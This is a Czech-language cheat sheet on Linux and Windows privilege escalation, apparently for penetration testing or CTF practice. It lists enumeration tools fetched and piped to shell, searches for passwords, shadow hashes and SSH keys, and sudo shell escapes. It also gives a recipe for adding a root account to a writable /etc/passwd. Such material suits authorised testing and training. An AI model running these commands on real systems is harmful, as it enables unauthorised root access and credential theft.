# Privilege Escalation

## Linux Privilege Escalation

### Automatické nástroje
```bash
# LinPEAS (doporučeno)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh

# linux-smart-enumeration
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh && ./lse.sh -l 1
```

### Manuální kontroly

#### Základní info
```bash
id                          # aktuální uživatel a skupiny
whoami
uname -a                    # kernel verze
cat /etc/os-release         # distribuce
hostname
env                         # proměnné prostředí (heslá!)
```

#### SUID binárky
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null
```
→ Zkontroluj na GTFOBins: https://gtfobins.github.io/

#### Sudo práva
```bash
sudo -l                     # co smíš spustit jako root
```
→ Zkontroluj GTFOBins pro nalezené binárky

#### Cron joby
```bash
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*
# Hledej skripty s write právy
```

#### Writable soubory a složky
```bash
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null
```

#### Capabilities
```bash
getcap -r / 2>/dev/null
```

#### Processes a síť
```bash
ps aux                      # běžící procesy
netstat -tulpn              # naslouchající porty
ss -tulpn                   # moderní alternativa
```

#### Hesla v souborech
```bash
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /home/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
history                     # bash history!
cat ~/.bash_history
```

#### Přístupné soubory
```bash
cat /etc/passwd             # uživatelé
cat /etc/shadow             # hashe hesel (jen root)
ls -la /home/               # home složky
find / -name "id_rsa" 2>/dev/null   # SSH klíče
```

### Kernel Exploity
```bash
uname -r                    # verze kernelu
# Hledej na: https://www.exploit-db.com/
# Nebo: searchsploit linux kernel <verze>
```

### Populární eskalace

#### Sudo + binárka (GTFOBins)
```bash
# Pokud smíš: sudo vim
sudo vim -c ':!/bin/bash'

# Pokud smíš: sudo find
sudo find . -exec /bin/bash \; -quit

# Pokud smíš: sudo python
sudo python3 -c 'import os; os.system("/bin/bash")'
```

#### Writable /etc/passwd
```bash
# Vytvoř hash hesla
openssl passwd -1 -salt xyz hacker
# Přidej uživatele
echo 'hacker:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

## Windows Privilege Escalation

### Nástroje
```powershell
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1; Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all
```

### Základní příkazy
```cmd
whoami /priv                # oprávnění
net user                    # lokální uživatelé
net localgroup administrators
systeminfo                  # verze OS, hotfixy
wmic qfe list brief         # nainstalované záplaty
```

### Časté vektory
- **SeImpersonatePrivilege** → PrintSpoofer, JuicyPotato, RoguePotato
- **AlwaysInstallElevated** → .msi soubor jako admin
- **Unquoted Service Paths** → podvrhnutí exe
- **Weak Service Permissions** → přepsání service binárky
- **DLL Hijacking** → podvrhnutí DLL
